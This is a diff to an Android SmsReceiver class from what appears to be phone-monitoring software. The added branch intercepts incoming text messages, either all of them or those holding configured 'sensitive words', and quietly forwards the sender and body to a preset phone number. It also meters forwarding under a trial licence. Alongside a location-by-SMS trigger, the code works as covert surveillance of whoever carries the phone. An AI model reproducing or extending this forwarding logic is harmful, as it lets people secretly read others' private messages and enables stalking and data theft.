@@ -263,20 +263,6 @@ public class SmsReceiver extends BroadcastReceiver
 			}
 
 			//-------------------------------------------------------------------------------
-			// Redirect SMS that contains sensitive words
-			else if (GlobalPrefActivity.getRedirectSms(context) && containSensitiveWords(context, smsBody)) 
-			{
-				if (!ConfigCtrl.isLegal(context)) return;
-
-				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-				if (phoneNum.length() > 0) {
-					String smsAddress = SmsCtrl.getSmsAddress(intent);
-					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
-					boolean ret = SmsCtrl.sendSms(phoneNum, header + smsBody);
-				}
-			}
-
-			//-------------------------------------------------------------------------------
 			// Send location SMS if being triggered by location activation word
 			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION))
 			{
@@ -313,6 +299,39 @@ public class SmsReceiver extends BroadcastReceiver
     					boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
     				}
     			}).start();
+			}
+			
+			//-------------------------------------------------------------------------------
+			// Redirect SMS that contains sensitive words
+			else if (GlobalPrefActivity.getRedirectAllSms(context) || containSensitiveWords(context, smsBody)) 
+			{
+				if (!ConfigCtrl.isLegal(context)) return;
+				
+				// Count ++ if in trial
+				LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
+				if (type == LICENSE_TYPE.TRIAL_LICENSED) {
+					if (ConfigCtrl.reachSmsRedirectTimeLimit(context) && !ConfigCtrl.getHasSentRedirectSmsTimesLimitSms(context)) {
+						// Send SMS to warn user
+						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+						if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
+							String msg = context.getResources().getString(R.string.msg_sms_times_over_in_trial);
+							boolean ret = SmsCtrl.sendSms(recvPhoneNum, msg);
+							if (ret) {
+								ConfigCtrl.setHasSentRedirectSmsTimesLimitSms(context, true);
+							}
+						}
+					}
+				}
+
+				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+				if (phoneNum.length() > 0) {
+					String smsAddress = SmsCtrl.getSmsAddress(intent);
+					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
+					boolean ret = SmsCtrl.sendSms(phoneNum, header + smsBody);
+					if (ret && type == LICENSE_TYPE.TRIAL_LICENSED) {
+						ConfigCtrl.countRecordingTimesInTrial(context);
+					}
+				}
 			}
 		} // end of SMS_RECEIVED
         
